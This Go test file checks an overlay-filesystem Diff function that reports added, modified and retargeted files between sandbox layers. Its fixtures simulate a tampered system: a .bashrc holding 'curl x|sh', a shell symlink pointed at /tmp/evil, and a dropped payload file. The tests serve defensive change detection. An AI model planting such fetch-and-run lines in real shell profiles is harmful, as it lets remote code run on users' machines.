package workspace

import (
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/Frostykiller3m/Quaarant/internal/backend"
)

// layers makes lower/ and upper/ from "path" -> content maps ("dir/" makes a directory,
// "->target" a symlink).
func layers(t *testing.T, lower, upper map[string]string) (string, string) {
	t.Helper()
	base := t.TempDir()
	l, u := filepath.Join(base, "lower"), filepath.Join(base, "upper")
	for dir, files := range map[string]map[string]string{l: lower, u: upper} {
		if err := os.MkdirAll(dir, 0o755); err != nil {
			t.Fatal(err)
		}
		for p, c := range files {
			full := filepath.Join(dir, filepath.FromSlash(strings.TrimSuffix(p, "/")))
			if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
				t.Fatal(err)
			}
			switch {
			case strings.HasSuffix(p, "/"):
				err := os.Mkdir(full, 0o755)
				if err != nil && !os.IsExist(err) {
					t.Fatal(err)
				}
			case strings.HasPrefix(c, "->"):
				if err := os.Symlink(strings.TrimPrefix(c, "->"), full); err != nil {
					t.Fatal(err)
				}
			default:
				if err := os.WriteFile(full, []byte(c), 0o644); err != nil {
					t.Fatal(err)
				}
			}
		}
	}
	return l, u
}

func summary(changes []backend.Change) []string {
	var out []string
	for _, c := range changes {
		s := fmt.Sprintf("%s %s", c.Kind, c.Path)
		if c.SHA256 != "" {
			s += fmt.Sprintf(" %d %s", c.Size, c.SHA256[:8])
		}
		if c.LinkTarget != "" {
			s += " -> " + c.LinkTarget
		}
		out = append(out, s)
	}
	return out
}

func TestDiff(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("needs symlinks and unix modes")
	}
	lower := map[string]string{
		"etc/":         "",
		"etc/motd":     "hello",
		"etc/same":     "unchanged",
		"etc/hosts":    "127.0.0.1",
		"bin/":         "",
		"bin/sh":       "->busybox",
		"usr/lib/libc": "libc",
		"var/log/":     "",
	}
	upper := map[string]string{
		"etc/":            "",
		"etc/motd":        "hello, changed", // modified content
		"etc/same":        "unchanged",      // copied up only: not reported
		"bin/":            "",
		"bin/sh":          "->/tmp/evil", // symlink retargeted
		"tmp/":            "",            // quiet dir: not reported itself
		"tmp/payload":     "x",
		"home/u/.bashrc":  "curl x|sh",
		"home/u/.ssh/":    "",
		".qt/qt-agent":    "", // hidden
		"var/log/new.log": "",
	}
	l, u := layers(t, lower, upper)
	if err := os.Chmod(filepath.Join(u, "etc", "hosts"), 0o600); err == nil {
		t.Fatal("setup: etc/hosts should not exist in upper")
	}
	// A mode change is a copy-up with new metadata.
	if err := os.WriteFile(filepath.Join(u, "etc", "hosts"), []byte("127.0.0.1"), 0o600); err != nil {
		t.Fatal(err)
	}
	got, err := Diff(l, u, DiffOptions{Hidden: []string{"/.qt"}, QuietDirs: []string{"/tmp"}})
	if err != nil {
		t.Fatal(err)
	}
	want := []string{
		"modified /bin/sh -> /tmp/evil",
		"modified /etc/hosts " + h("127.0.0.1"),
		"modified /etc/motd " + h("hello, changed"),
		"added /home",
		"added /home/u",
		"added /home/u/.bashrc " + h("curl x|sh"),
		"added /home/u/.ssh",
		"added /tmp/payload " + h("x"),
		"added /var/log/new.log " + h(""),
	}
	if g := summary(got); strings.Join(g, "\n") != strings.Join(want, "\n") {
		t.Errorf("diff:\n%s\nwant:\n%s", strings.Join(g, "\n"), strings.Join(want, "\n"))
	}
	for _, c := range got {
		if c.Path == "/etc/hosts" && c.Mode.Perm() != 0o600 {
			t.Errorf("mode = %v", c.Mode)
		}
	}
}

func TestDiffEmptyAndTruncated(t *testing.T) {
	l, u := layers(t, map[string]string{"a": "1"}, map[string]string{})
	got, err := Diff(l, u, DiffOptions{})
	if err != nil || len(got) != 0 {
		t.Fatalf("empty upper: %v %v", got, err)
	}
	files := map[string]string{}
	for i := range 20 {
		files[fmt.Sprintf("f%02d", i)] = "x"
	}
	l, u = layers(t, nil, files)
	got, err = Diff(l, u, DiffOptions{MaxChanges: 5})
	if !errors.Is(err, backend.ErrDiffTruncated) || len(got) != 5 {
		t.Fatalf("truncation: %d changes, err %v", len(got), err)
	}
}

func TestDiffNamesAreData(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("needs unix file names")
	}
	evil := "x\x1b[31mred\nline\xff"
	l, u := layers(t, nil, map[string]string{evil: "data"})
	got, err := Diff(l, u, DiffOptions{})
	if err != nil || len(got) != 1 || got[0].Path != "/"+evil {
		t.Fatalf("diff = %+v %v", got, err)
	}
}

// h is how summary prints a regular file with this content: size and sha256 prefix.
func h(content string) string {
	sum := sha256.Sum256([]byte(content))
	return fmt.Sprintf("%d %s", len(content), hex.EncodeToString(sum[:])[:8])
}
